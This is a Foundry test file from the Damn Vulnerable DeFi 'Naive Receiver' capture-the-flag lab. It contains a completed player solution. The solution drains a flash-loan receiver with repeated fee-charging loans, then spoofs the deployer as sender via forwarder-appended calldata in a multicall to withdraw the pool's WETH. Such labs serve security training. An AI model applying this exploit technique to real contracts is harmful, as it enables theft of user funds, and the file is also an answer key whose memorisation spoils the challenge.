// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(
            address(forwarder),
            payable(weth),
            deployer
        );

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        bytes memory callDataFlashloan = abi.encodeWithSelector(
            pool.flashLoan.selector,
            receiver,
            address(weth),
            WETH_IN_POOL, // amount
            bytes("") // data
        );

        bytes[] memory calls = new bytes[](11);

        for (uint256 i = 0; i < 10; i++) {
            // Forward the call to the pool
            calls[i] = callDataFlashloan;
        }

        //
        bytes memory callDataWithdraw = abi.encodePacked(
            abi.encodeWithSelector(
                pool.withdraw.selector,
                WETH_IN_POOL + WETH_IN_RECEIVER, // amount
                payable(recovery)
            ),
            address(deployer) // the forwarder will use this address as the sender
        );
        calls[10] = callDataWithdraw;

        BasicForwarder.Request memory req = BasicForwarder.Request({
            from: address(player), // the actual signer
            target: address(pool), // the target contract
            value: 0,
            gas: 10000000,
            nonce: 0,
            data: abi.encodeWithSelector(pool.multicall.selector, calls),
            deadline: block.timestamp + 10 minutes
        });

        bytes32 digest = forwarder.getDataHash(req);
        bytes32 typed = forwarder.hashTypedData(digest);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, typed);
        bytes memory sig = abi.encodePacked(r, s, v);

        forwarder.execute{value: 0}(req, sig);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(
            weth.balanceOf(address(receiver)),
            0,
            "Unexpected balance in receiver contract"
        );

        // Pool is empty too
        assertEq(
            weth.balanceOf(address(pool)),
            0,
            "Unexpected balance in pool"
        );

        // All funds sent to recovery account
        assertEq(
            weth.balanceOf(recovery),
            WETH_IN_POOL + WETH_IN_RECEIVER,
            "Not enough WETH in recovery account"
        );
    }
}
